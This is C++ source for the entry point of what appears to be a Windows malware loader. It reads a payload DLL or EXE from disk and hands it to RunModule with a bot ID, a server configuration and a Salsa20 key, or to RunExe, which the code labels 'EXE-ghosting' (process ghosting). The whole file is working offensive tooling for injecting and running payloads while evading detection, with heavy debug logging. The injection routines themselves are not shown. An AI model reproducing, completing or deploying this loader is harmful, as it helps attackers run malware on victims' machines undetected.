#include "injector.h"
#include "utils.h"
#include "config.h"

#include <cstdlib>   
#include <ctime>     
#include <vector>
#include <fstream>

static std::vector<BYTE> LoadFile(const std::wstring& path)
{
    Log("[DBG] LoadFile(\"%ws\")", path.c_str());

    std::ifstream f(path, std::ios::binary | std::ios::ate);
    if (!f)
    {
        Log("[DBG] LoadFile() -- fopen failed, GLE=%lu", GetLastError());
        return {};
    }

    const size_t sz = static_cast<size_t>(f.tellg());
    std::vector<BYTE> buf(sz);

    f.seekg(0);
    f.read(reinterpret_cast<char*>(buf.data()), sz);

    Log("[DBG] LoadFile() OK, %zu bytes read", sz);
    return buf;
}

int wmain(int argc, wchar_t** argv)
{
    EnsureConsole();
    Log("────────────────────────────────────────────────────────────");
    Log("[*] injector started (argc=%d)", argc);
    srand(static_cast<unsigned>(time(nullptr)));
    for (int i = 0; i < argc; ++i)
        Log("[ARG] argv[%d] = \"%ws\"", i, argv[i]);

    if (argc < 2)
    {
        Log("[!] usage: %ls <payload.dll|payload.exe> [--cmd \"<cmdline>\"]",
            argv[0]);
        return 1;
    }
    std::wstring filePath = argv[1];
    Log("[DBG] step 1: reading payload \"%ws\"", filePath.c_str());

    auto payload = LoadFile(filePath);
    if (payload.empty())
    {
        Log("[!] cannot read \"%ws\" -- payload is empty", filePath.c_str());
        return 2;
    }
    Log("[DBG] payload size = %zu bytes", payload.size());

    std::wstring exeCmd = Config::ExeCmdlineDefault;
    for (int i = 2; i + 1 < argc; ++i)
    {
        if (!_wcsicmp(argv[i], L"--cmd"))
        {
            exeCmd = argv[i + 1];
            break;
        }
    }
    Log("[DBG] exeCmd = \"%ws\"", exeCmd.c_str());
    const bool isDll =
        (filePath.rfind(L".dll") != std::wstring::npos) ||
        (filePath.rfind(L".DLL") != std::wstring::npos);

    Log("[DBG] branch = %s", isDll ? "RunModule (DLL)" : "RunExe (EXE-ghosting)");
    DWORD       pid = 0;
    std::string err;
    DWORD       rc  = 0;

    if (isDll)
    {
        Log("[DBG] → calling RunModule()");
        rc = RunModule(
                payload.data(),
                static_cast<DWORD>(payload.size()),
                Config::BotId.c_str(),
                const_cast<char*>(Config::ServerCfg.c_str()),
                const_cast<LPBYTE>(Config::Salsa20Key.data()),
                Config::Reserved.empty()
                    ? nullptr
                    : const_cast<LPBYTE>(Config::Reserved.data()),
                static_cast<DWORD>(Config::Reserved.size()),
                err,
                &pid);

        Log("[RET] RunModule rc=%lu  pid=%lu  err=\"%s\"",
            rc, pid, err.c_str());
    }
    else
    {
        Log("[DBG] → calling RunExe()");
        rc = RunExe(
                payload.data(),
                static_cast<DWORD>(payload.size()),
                exeCmd.c_str(),
                err);

        Log("[RET] RunExe rc=%lu  err=\"%s\"", rc, err.c_str());
    }

    Log("[*] finished, rc=%lu", rc);
    Log("[*] press <Enter> to exit");
    getchar();
    return rc;
}
